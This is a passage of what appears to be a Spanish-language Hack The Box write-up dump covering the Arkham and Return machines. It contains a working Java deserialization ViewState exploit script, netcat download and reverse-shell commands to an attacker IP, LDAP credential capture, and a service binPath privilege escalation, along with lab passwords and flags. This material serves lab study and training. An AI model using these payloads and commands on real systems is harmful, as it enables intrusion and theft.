\\x2c\\x4c\\x6f\\x72\\x67\\x2f\\x61\\x70\\x61\\x63\\x68\\x65\\x2f\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x73\\x2f\\x63\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f ' payload += b ' \\x6e\\x73\\x2f\\x54\\x72\\x61\\x6e\\x73\\x66\\x6f\\x72\\x6d\\x65\\x72\\x3b\\x78\\x70\\x73\\x72\\x00\\x3a\\x6f\\x72\\x67\\x2e\\x61\\x70\\x61\\x63\\x68 ' payload += b ' \\x65\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x73\\x2e\\x63\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x73\\x2e\\x66\\x75\\x6e\\x63\\x74\\x6f\\x72\\x73 ' payload += b ' \\x2e\\x43\\x68\\x61\\x69\\x6e\\x65\\x64\\x54\\x72\\x61\\x6e\\x73\\x66\\x6f\\x72\\x6d\\x65\\x72\\x30\\xc7\\x97\\xec\\x28\\x7a\\x97\\x04\\x02\\x00\\x01 ' payload += b ' \\x5b\\x00\\x0d\\x69\\x54\\x72\\x61\\x6e\\x73\\x66\\x6f\\x72\\x6d\\x65\\x72\\x73\\x74\\x00\\x2d\\x5b\\x4c\\x6f\\x72\\x67\\x2f\\x61\\x70\\x61\\x63\\x68 ' payload += b ' \\x65\\x2f\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x73\\x2f\\x63\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x73\\x2f\\x54\\x72\\x61\\x6e\\x73\\x66\\x6f\\x72 ' payload += b ' \\x6d\\x65\\x72\\x3b\\x78\\x70\\x75\\x72\\x00\\x2d\\x5b\\x4c\\x6f\\x72\\x67\\x2e\\x61\\x70\\x61\\x63\\x68\\x65\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x73 ' payload += b ' \\x2e\\x63\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x73\\x2e\\x54\\x72\\x61\\x6e\\x73\\x66\\x6f\\x72\\x6d\\x65\\x72\\x3b\\xbd\\x56\\x2a\\xf1\\xd8 ' payload += b ' \\x34\\x18\\x99\\x02\\x00\\x00\\x78\\x70\\x00\\x00\\x00\\x05\\x73\\x72\\x00\\x3b\\x6f\\x72\\x67\\x2e\\x61\\x70\\x61\\x63\\x68\\x65\\x2e\\x63\\x6f\\x6d ' payload += b ' \\x6d\\x6f\\x6e\\x73\\x2e\\x63\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x73\\x2e\\x66\\x75\\x6e\\x63\\x74\\x6f\\x72\\x73\\x2e\\x43\\x6f\\x6e\\x73 ' payload += b ' \\x74\\x61\\x6e\\x74\\x54\\x72\\x61\\x6e\\x73\\x66\\x6f\\x72\\x6d\\x65\\x72\\x58\\x76\\x90\\x11\\x41\\x02\\xb1\\x94\\x02\\x00\\x01\\x4c\\x00\\x09\\x69 ' payload += b ' \\x43\\x6f\\x6e\\x73\\x74\\x61\\x6e\\x74\\x71\\x00\\x7e\\x00\\x01\\x78\\x70\\x76\\x72\\x00\\x11\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x52 ' payload += b ' \\x75\\x6e\\x74\\x69\\x6d\\x65\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x78\\x70\\x73\\x72\\x00\\x3a\\x6f\\x72\\x67\\x2e\\x61\\x70\\x61 ' payload += b ' \\x63\\x68\\x65\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x73\\x2e\\x63\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x73\\x2e\\x66\\x75\\x6e\\x63\\x74\\x6f ' payload += b ' \\x72\\x73\\x2e\\x49\\x6e\\x76\\x6f\\x6b\\x65\\x72\\x54\\x72\\x61\\x6e\\x73\\x66\\x6f\\x72\\x6d\\x65\\x72\\x87\\xe8\\xff\\x6b\\x7b\\x7c\\xce\\x38\\x02 ' payload += b ' \\x00\\x03\\x5b\\x00\\x05\\x69\\x41\\x72\\x67\\x73\\x74\\x00\\x13\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x4f\\x62\\x6a\\x65\\x63 ' payload += b ' \\x74\\x3b\\x4c\\x00\\x0b\\x69\\x4d\\x65\\x74\\x68\\x6f\\x64\\x4e\\x61\\x6d\\x65\\x71\\x00\\x7e\\x00\\x05\\x5b\\x00\\x0b\\x69\\x50\\x61\\x72\\x61\\x6d ' payload += b ' \\x54\\x79\\x70\\x65\\x73\\x74\\x00\\x12\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x43\\x6c\\x61\\x73\\x73\\x3b\\x78\\x70\\x75\\x72 ' payload += b ' \\x00\\x13\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x4f\\x62\\x6a\\x65\\x63\\x74\\x3b\\x90\\xce\\x58\\x9f\\x10\\x73\\x29\\x6c\\x02 ' payload += b ' \\x00\\x00\\x78\\x70\\x00\\x00\\x00\\x02\\x74\\x00\\x0a\\x67\\x65\\x74\\x52\\x75\\x6e\\x74\\x69\\x6d\\x65\\x75\\x72\\x00\\x12\\x5b\\x4c\\x6a\\x61\\x76 ' payload += b ' \\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x43\\x6c\\x61\\x73\\x73\\x3b\\xab\\x16\\xd7\\xae\\xcb\\xcd\\x5a\\x99\\x02\\x00\\x00\\x78\\x70\\x00\\x00\\x00\\x00 ' payload += b ' \\x74\\x00\\x09\\x67\\x65\\x74\\x4d\\x65\\x74\\x68\\x6f\\x64\\x75\\x71\\x00\\x7e\\x00\\x2f\\x00\\x00\\x00\\x02\\x76\\x72\\x00\\x10\\x6a\\x61\\x76\\x61 ' payload += b ' \\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x53\\x74\\x72\\x69\\x6e\\x67\\xa0\\xf0\\xa4\\x38\\x7a\\x3b\\xb3\\x42\\x02\\x00\\x00\\x78\\x70\\x76\\x71\\x00\\x7e\\x00 ' payload += b ' \\x2f\\x73\\x71\\x00\\x7e\\x00\\x28\\x75\\x71\\x00\\x7e\\x00\\x2c\\x00\\x00\\x00\\x02\\x70\\x75\\x71\\x00\\x7e\\x00\\x2c\\x00\\x00\\x00\\x00\\x74\\x00 ' payload += b ' \\x06\\x69\\x6e\\x76\\x6f\\x6b\\x65\\x75\\x71\\x00\\x7e\\x00\\x2f\\x00\\x00\\x00\\x02\\x76\\x72\\x00\\x10\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67 ' payload += b ' \\x2e\\x4f\\x62\\x6a\\x65\\x63\\x74\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x78\\x70\\x76\\x71\\x00\\x7e\\x00\\x2c\\x73\\x71\\x00\\x7e ' payload += b ' \\x00\\x28\\x75\\x72\\x00\\x13\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\xad\\xd2\\x56\\xe7\\xe9 ' payload += b ' \\x1d\\x7b\\x47\\x02\\x00\\x00\\x78\\x70\\x00\\x00\\x00\\x01\\x74\\x00 ' payload += chr ( len ( cmd )) . encode () payload += cmd . encode () payload += b ' \\x74\\x00\\x04\\x65\\x78\\x65\\x63\\x75\\x71\\x00\\x7e\\x00\\x2f\\x00\\x00\\x00\\x01 ' payload += b ' \\x71\\x00\\x7e\\x00\\x34\\x73\\x71\\x00\\x7e\\x00\\x24\\x73\\x72\\x00\\x11\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x49\\x6e\\x74\\x65\\x67 ' payload += b ' \\x65\\x72\\x12\\xe2\\xa0\\xa4\\xf7\\x81\\x87\\x38\\x02\\x00\\x01\\x49\\x00\\x05\\x76\\x61\\x6c\\x75\\x65\\x78\\x72\\x00\\x10\\x6a\\x61\\x76\\x61\\x2e ' payload += b ' \\x6c\\x61\\x6e\\x67\\x2e\\x4e\\x75\\x6d\\x62\\x65\\x72\\x86\\xac\\x95\\x1d\\x0b\\x94\\xe0\\x8b\\x02\\x00\\x00\\x78\\x70\\x00\\x00\\x00\\x01\\x73\\x72 ' payload += b ' \\x00\\x11\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x48\\x61\\x73\\x68\\x4d\\x61\\x70\\x05\\x07\\xda\\xc1\\xc3\\x16\\x60\\xd1\\x03\\x00\\x02 ' payload += b ' \\x46\\x00\\x0a\\x6c\\x6f\\x61\\x64\\x46\\x61\\x63\\x74\\x6f\\x72\\x49\\x00\\x09\\x74\\x68\\x72\\x65\\x73\\x68\\x6f\\x6c\\x64\\x78\\x70\\x3f\\x40\\x00 ' payload += b ' \\x00\\x00\\x00\\x00\\x00\\x77\\x08\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x78\\x78 ' return encrypt_data ( payload ) def encrypt_data ( payload ): key = b64decode ( 'SnNGOTg3Ni0=' ) obj = pyDes . des ( key , pyDes . ECB , padmode = pyDes . PAD_PKCS5 ) encryted_data = obj . encrypt ( payload ) hash_value = ( hmac . new ( key , bytes ( encryted_data ), sha1 ) . digest ()) encrypted_view_state = encryted_data + hash_value return b64encode ( encrypted_view_state ) def decrypt_view_state ( viewstate ): key = b64decode ( 'SnNGOTg3Ni0=' ) viewstate = b64decode ( viewstate ) #Padding para hacer viewstate multiplo de 8 padding = b ' \\x00\\x00\\x00\\x00 ' viewstate += padding obj = pyDes . des ( key , pyDes . ECB , padmode = pyDes . PAD_PKCS5 ) view_state_decrypted = obj . decrypt ( viewstate ) return view_state_decrypted def exploit ( cmd ): viewstate = createpayload ( cmd ) data = { 'javax.faces.ViewState' : viewstate } r = requests . post ( url , data = data ) print ( r . text ) if __name__ == '__main__' : #print(decrypt_view_state(\"wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RUcOXXNAvTSC70KtDtngjDm0mNzA9qHjYerxo0jW7zu1a6WhnEtXrTblezs7Z7sOU6L5UMg=\")) while True : cmd = input ( \"> \" ) exploit ( cmd ) Se sube un netcat al equipo: netcat 1.12 rlwrap python decryptor2.py cmd /c powershell iwr http://10.10.14.11/nc.exe -outfile c:\\\\windows\\\\temp\\\\nc.exe cmd /c c:\\\\windows\\\\temp\\\\nc.exe -e powershell 10.10.14.11 443 PS C:\\tomcat\\apache-tomcat-8.5.37\\bin> whoami arkham\\alfred PS C:\\users\\alfred\\desktop> type user.txt ba659321c89c48a3dcb915bc46d58071","title":"Exploit mejorado"},{"location":"maquinas/windows/arkham/#escalate-privileges","text":"Se inspeccionan los recursos de la m\u00e1quina: PS C :\\ users \\ alfred \\ Downloads \\ backups > cp backup . zip \\\\ 10 . 10 . 14 . 11 \\ recurso \\ backup2 . zip Parece que da problemas, probamos a encodearlo con certutil: certutil.exe -encode backup.zip C:\\Windows\\Temp\\encodedata Input Length = 124257 Output Length = 170910 CertUtil: -encode command completed successfully. El backup contiene un ost, se puede abrir con readpst : readpst alfred@arkham.local.ost Opening PST file and indexes... Processing Folder \"Deleted Items\" Processing Folder \"Inbox\" Processing Folder \"Outbox\" Processing Folder \"Sent Items\" Processing Folder \"Calendar\" Processing Folder \"Contacts\" Processing Folder \"Conversation Action Settings\" Processing Folder \"Drafts\" \"Calendar\" - 0 items done, 3 items skipped. Processing Folder \"Journal\" Processing Folder \"Junk E-Mail\" Processing Folder \"Notes\" Processing Folder \"Tasks\" Processing Folder \"Sync Issues\" Processing Folder \"RSS Feeds\" Processing Folder \"Quick Step Settings\" \"alfred@arkham.local.ost\" - 15 items done, 0 items skipped. \"Inbox\" - 0 items done, 7 items skipped. \"Drafts\" - 1 items done, 0 items skipped. Processing Folder \"Conflicts\" Processing Folder \"Local Failures\" Processing Folder \"Server Failures\" \"Sync Issues\" - 3 items done, 0 items skipped. Se encuentra una imagen en base64 con credenciales: batman:Zx^#QZX+T!123 cme smb 10 .10.10.130 --shares -u 'batman' -p 'Zx^#QZX+T!123' SMB 10 .10.10.130 445 ARKHAM [ * ] Windows 10 .0 Build 17763 x64 ( name:ARKHAM ) ( domain:ARKHAM ) ( signing:False ) ( SMBv1:False ) SMB 10 .10.10.130 445 ARKHAM [ + ] ARKHAM \\b atman:Zx^#QZX+T!123 SMB 10 .10.10.130 445 ARKHAM [ + ] Enumerated shares SMB 10 .10.10.130 445 ARKHAM Share Permissions Remark SMB 10 .10.10.130 445 ARKHAM ----- ----------- ------ SMB 10 .10.10.130 445 ARKHAM ADMIN$ Remote Admin SMB 10 .10.10.130 445 ARKHAM BatShare Master Wayne 's secrets SMB 10.10.10.130 445 ARKHAM C$ Default share SMB 10.10.10.130 445 ARKHAM IPC$ READ Remote IPC SMB 10.10.10.130 445 ARKHAM Users READ smbclient \\\\\\\\10.10.10.130\\\\Users -U batman Enter WORKGROUP\\batman' s password: Ejecutamos script con las credenciales de Batman: $secPass = ConvertTo-SecureString 'Zx^#QZX+T!123' -AsPlainText -Force $cred = New-Object System . Management . Automation . PSCredential ( 'ARKHAM\\batman' , $secPass ) Invoke-Command -ComputerName ARKHAM -Credential $cred -ScriptBlock { whoami } Invoke-Command -ComputerName ARKHAM -Credential $cred -ScriptBlock { cmd / c c :\\ temp \\ nc . exe -e powershell 10 . 10 . 14 . 11 8443 } Batman est\u00e1 dentro del grupo administradores, pero est\u00e1 capado, se puede realizar este bypass: net use z : \\\\ ARKHAM \\ c $ The command completed successfully . cat z :\\ users \\ administrator \\ desktop \\ root . txt 636783f913109f2809701e8545ef4fdb","title":"Escalate Privileges"},{"location":"maquinas/windows/return/","text":"Return HTB Recon Se comprueba que la m\u00e1quina est\u00e1 activa: ping 10.10.11.108 Enum Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -p- -n --open --min-rate 5000 -oG allPorts 10.10.11.108 Se realiza un scan de los puertos abiertos: nmap -sCV -p53,80,88,135,139,389,445,464,593,636,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49679,49682,49694 10.10.11.108 -oN openPorts PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: HTB Printer Admin Panel 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-08-15 10:57:45Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC 49674/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49675/tcp open msrpc Microsoft Windows RPC 49679/tcp open msrpc Microsoft Windows RPC 49682/tcp open msrpc Microsoft Windows RPC 49694/tcp open msrpc Microsoft Windows RPC Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2022-08-15T10:58:37 |_ start_date: N/A | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required |_clock-skew: 18m34s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 67.16 seconds Intrusi\u00f3n con user (svc-printer) Conectando a http://10.10.11.108/settings.php se puede ver que el usuario por defecto manda por ldap credenciales, se modifica el servidor a la ip de la m\u00e1quina atacante y se recibe la password: > nc -lvnp 389 Ncat : Version 7 . 92 ( https :// nmap . org / ncat ) Ncat : Listening on ::: 389 Ncat : Listening on 0 . 0 . 0 . 0 : 389 Ncat : Connection from 10 . 10 . 11 . 108 . Ncat : Connection from 10 . 10 . 11 . 108 : 59469 . 0 *` %return \\ svc-printer \ufffd 1edFg43012 !! > cme smb 10 . 10 . 11 . 108 -u 'svc-printer' -p '1edFg43012!!' SMB 10 . 10 . 11 . 108 445 PRINTER [*] Windows 10 . 0 Build 17763 x64 ( name : PRINTER ) ( domain : return . local ) ( signing : True ) ( SMBv1 : False ) SMB 10 . 10 . 11 . 108 445 PRINTER [+] return . local \\ svc-printer : 1edFg43012 !! > smbmap -H 10 . 10 . 11 . 108 -u 'svc-printer' -p '1edFg43012!!' [+] IP : 10 . 10 . 11 . 108 : 445 Name : return . local Disk Permissions Comment ---- ----------- ------- ADMIN $ READ ONLY Remote Admin C $ READ , WRITE Default share IPC $ READ ONLY Remote IPC NETLOGON READ ONLY Logon server share SYSVOL READ ONLY Logon server share > smbclient \\\\\\\\ 10 . 10 . 11 . 108 \\\\ C $ -U svc-printer Enter WORKGROUP \\ svc-printer 's password: Try \"help\" to get a list of possible commands. smb: \\> dir $Recycle.Bin DHS 0 Sat Sep 15 09:19:00 2018 Config.Msi DHS 0 Mon Sep 27 13:46:53 2021 Documents and Settings DHSrn 0 Thu May 20 21:08:51 2021 inetpub D 0 Thu May 20 16:19:09 2021 pagefile.sys AHS 738197504 Mon Aug 15 12:54:09 2022 PerfLogs D 0 Sat Sep 15 09:19:00 2018 Program Files DR 0 Mon Sep 27 13:46:28 2021 Program Files (x86) D 0 Wed May 26 11:57:54 2021 ProgramData DH 0 Mon Sep 27 13:46:01 2021 Recovery DHSn 0 Tue Jul 13 12:02:13 2021 System Volume Information DHS 0 Thu May 20 14:42:27 2021 Users DR 0 Wed May 26 10:51:28 2021 Windows D 0 Mon Sep 27 13:49:07 2021 > evil-winrm -i 10.10.11.108 -u \"svc-printer\" -p ' 1edFg43012 !! ' >> *Evil-WinRM* PS C:\\Users\\svc-printer\\Documents> whoami return\\svc-printer >>*Evil-WinRM* PS C:\\Users\\svc-printer\\desktop> cat user.txt c1f2c9b2c96d15f83dce949a6f854118 >> *Evil-WinRM* PS C:\\Users> (Get-Acl -Path ' C :\\ users \\ administrator ' ). access | Format-Table -Autosize FileSystemRights AccessControlType IdentityReference IsInherited InheritanceFlags PropagationFlags ---------------- ----------------- ----------------- ----------- ---------------- ---------------- FullControl Allow NT AUTHORITY \\ SYSTEM False ContainerInherit , ObjectInherit None FullControl Allow BUILTIN \\ Administrators False ContainerInherit , ObjectInherit None FullControl Allow RETURN \\ Administrator False ContainerInherit , ObjectInherit None Escalate privileges (Server Operator) Se debe tener en cuenta que con los permisos del grupo \"Server Operator\" se pueden modificar, parar, e iniciar servicios: > *Evil-WinRM* PS C:\\Users\\svc-printer\\Documents> net user svc-printer User name svc-printer Full Name SVCPrinter Comment Service Account for Printer User's comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 5/26/2021 1:15:13 AM Password expires Never Password changeable 5/27/2021 1:15:13 AM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 8/15/2022 9:39:53 AM Logon hours allowed All Local Group Memberships *Print Operators *Remote Management Use *Server Operators Global Group memberships *Domain Users The command completed successfully. > *Evil-WinRM* PS C:\\Users\\svc-printer\\Documents> whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= =================================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeLoadDriverPrivilege Load and unload device drivers Enabled SeSystemtimePrivilege Change the system time Enabled SeBackupPrivilege Back up files and directories Enabled SeRestorePrivilege Restore files and directories Enabled SeShutdownPrivilege Shut down the system Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeRemoteShutdownPrivilege Force shutdown from a remote system Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled SeTimeZonePrivilege Change the time zone Enabled Se descarga Winpeas para hacer una enumeraci\u00f3n: *Evil-WinRM* PS C:\\Users\\svc-printer\\Documents> iwr http://10.10.14.11/winpeas.exe -outfile winpeas.exe *Evil-WinRM* PS C:\\Users\\svc-printer\\Documents> ./winpeas.exe De forma mas sencilla se pueden enumerar los servicios directamente: # Se aprecia servicio con permisos de System: > * Evil-WinRM * PS C :\\ Users \\ svc-printer \\ Documents > cmd / c sc qc VGAuthService [SC] QueryServiceConfig SUCCESS SERVICE_NAME : VGAuthService TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 2 AUTO_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : \"C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\VGAuthService.exe\" LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : VMware Alias Manager and Ticket Service DEPENDENCIES : SERVICE_START_NAME : LocalSystem # Incluimos el user svc-printer a grupo de administrators: > * Evil-WinRM * PS C :\\ Users \\ svc-printer \\ Documents > cmd / c sc config VGAuthService binPath = \"cmd /c net localgroup Administrators svc-printer /add\" [SC] ChangeServiceConfig SUCCESS # Se para el servicio ya que esta corriendo actualmente: > * Evil-WinRM * PS C :\\ Users \\ svc-printer \\ Documents > cmd / c sc stop VGAuthService SERVICE_NAME : VGAuthService TYPE : 10 WIN32_OWN_PROCESS STATE : 1 STOPPED WIN32_EXIT_CODE : 0 ( 0x0 ) SERVICE_EXIT_CODE : 0 ( 0x0 ) CHECKPOINT : 0x0 WAIT_HINT : 0x0 # Y se vuelve a iniciar para que ejecute nuesto c\u00f3digo malicioso: > * Evil-WinRM * PS C :\\ Users \\ svc-printer \\ Documents > cmd / c sc start VGAuthService [SC] StartService FAILED 1053 : The service did not respond to the start or control request in a timely fashion . # Comprobamos que se ha ejecutado nuestro c\u00f3digo: > * Evil-WinRM * PS C :\\ Users \\ svc-printer \\ Documents > net localgroup administrators Alias name administrators Comment Administrators have complete and unrestricted access to the computer / domain Members ------------------------------------------------------------------------------- Administrator Domain Admins Enterprise Admins svc-printer The command completed successfully . # Y por \u00faltimo tras salir y volver a entrar ya nos aplican los permisos del grupo de administradores locales: > * Evil-WinRM * PS C :\\ Users \\ administrator \\ desktop > cat root . txt 3aac5fdbc4b66b914df7797619328429","title":"Return"},{"location":"maquinas/windows/return/#return-htb","text":"","title":"Return HTB"},{"location":"maquinas/windows/return/#recon","text":"Se comprueba que la m\u00e1quina est\u00e1 activa: ping 10.10.11.108","title":"Recon"},{"location":"maquinas/windows/return/#enum","text":"Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -p- -n --open --min-rate 5000 -oG allPorts 10.10.11.108 Se realiza un scan de los puertos abiertos: nmap -sCV -p53,80,88,135,139,389,445,464,593,636,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49679,49682,49694 10.10.11.108 -oN openPorts PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: HTB Printer Admin Panel 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-08-15 10:57:45Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC 49674/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49675/tcp open msrpc Microsoft Windows RPC 49679/tcp open msrpc Microsoft Windows RPC 49682/tcp open msrpc Microsoft Windows RPC 49694/tcp open msrpc Microsoft Windows RPC Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2022-08-15T10:58:37 |_ start_date: N/A | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required |_clock-skew: 18m34s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 67.16 seconds","title":"Enum"},{"location":"maquinas/windows/return/#intrusion-con-user-svc-printer","text":"Conectando a http://10.10.11.108/settings.php se puede ver que el usuario por defecto manda por ldap credenciales, se modifica el servidor a la ip de la m\u00e1quina atacante y se recibe la password: > nc -lvnp 389 Ncat : Version 7 . 92 ( https :// nmap . org / ncat ) Ncat : Listening on ::: 389 Ncat : Listening on 0 . 0 . 0 . 0 : 389 Ncat : Connection from 10 . 10 . 11 . 108 . Ncat : Connection from 10 . 10 . 11 . 108 : 59469 . 0 *` %return \\ svc-printer \ufffd 1edFg43012 !! > cme smb 10 . 10 . 11 . 108 -u 'svc-printer' -p '1edFg43012!!' SMB 10 . 10 . 11 . 108 445 PRINTER [*] Windows 10 . 0 Build 17763 x64 ( name : PRINTER ) ( domain : return . local ) ( signing : True ) ( SMBv1 : False ) SMB 10 . 10 . 11 . 108 445 PRINTER [+] return . local \\ svc-printer : 1edFg43012 !! > smbmap -H 10 . 10 . 11 . 108 -u 'svc-printer' -p '1edFg43012!!' [+] IP : 10 . 10 . 11 . 108 : 445 Name : return . local Disk Permissions Comment ---- ----------- ------- ADMIN $ READ ONLY Remote Admin C $ READ , WRITE Default share IPC $ READ ONLY Remote IPC NETLOGON READ ONLY Logon server share SYSVOL READ ONLY Logon server share > smbclient \\\\\\\\ 10 . 10 . 11 . 108 \\\\ C $ -U svc-printer Enter WORKGROUP \\ svc-printer 's password: Try \"help\" to get a list of possible commands. smb: \\> dir $Recycle.Bin DHS 0 Sat Sep 15 09:19:00 2018 Config.Msi DHS 0 Mon Sep 27 13:46:53 2021 Documents and Settings DHSrn 0 Thu May 20 21:08:51 2021 inetpub D 0 Thu May 20 16:19:09 2021 pagefile.sys AHS 738197504 Mon Aug 15 12:54:09 2022 PerfLogs D 0 Sat Sep 15 09:19:00 2018 Program Files DR 0 Mon Sep 27 13:46:28 2021 Program Files (x86) D 0 Wed May 26 11:57:54 2021 ProgramData DH 0 Mon Sep 27 13:46:01 2021 Recovery DHSn 0 Tue Jul 13 12:02:13 2021 System Volume Information DHS 0 Thu May 20 14:42:27 2021 Users DR 0 Wed May 26 10:51:28 2021 Windows D 0 Mon Sep 27 13:49:07 2021 > evil-winrm -i 10.10.11.108 -u \"svc-printer\" -p ' 1edFg43012 !! ' >> *Evil-WinRM* PS C:\\Users\\svc-printer\\Documents> whoami return\\svc-printer >>*Evil-WinRM* PS C:\\Users\\svc-printer\\desktop> cat user.txt c1f2c9b2c96d15f83dce949a6f854118 >> *Evil-WinRM* PS C:\\Users> (Get-Acl -Path ' C :\\ users \\ administrator ' ). access | Format-Table -Autosize FileSystemRights AccessControlType IdentityReference IsInherited InheritanceFlags PropagationFlags ---------------- ----------------- ----------------- ----------- ---------------- ---------------- FullControl Allow NT AUTHORITY \\ SYSTEM False ContainerInherit , ObjectInherit None FullControl Allow BUILTIN \\ Administrators False ContainerInherit , ObjectInherit None FullControl Allow RETURN \\ Administrator False ContainerInherit , ObjectInherit None","title":"Intrusi\u00f3n con user (svc-printer)"},{"location":"maquinas/windows/return/#escalate-privileges-server-operator","text":"Se debe tener en cuenta que con los permisos del grupo \"Server Operator\" se pueden modificar, parar, e iniciar servicios: > *Evil-WinRM* PS C:\\Users\\svc-printer\\Documents> net user svc-printer User name svc-printer Full Name SVCPrinter Comment Service Account for Printer User's comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 5/26/2021 1:15:13 AM Password expires Never Password changeable 5/27/2021 1:15:13 AM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 8/15/2022 9:39:53 AM Logon hours allowed All Local Group Memberships *Print Operators *Remote Management Use *Server Operators Global Group memberships *Domain Users The command completed successfully. > *Evil-WinRM* PS C:\\Users\\svc-printer\\Documents> whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= =================================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeLoadDriverPrivilege Load and unload device drivers Enabled SeSystemtimePrivilege Change the system time Enabled SeBackupPrivilege Back up files and directories Enabled SeRestorePrivilege Restore files and directories Enabled SeShutdownPrivilege Shut down the system Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeRemoteShutdownPrivilege Force shutdown from a remote system Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled SeTimeZonePrivilege Change the time zone Enabled Se descarga Winpeas para hacer una enumeraci\u00f3n: *Evil-WinRM* PS C:\\Users\\svc-printer\\Documents> iwr http://10.10.14.11/winpeas.exe -outfile winpeas.exe 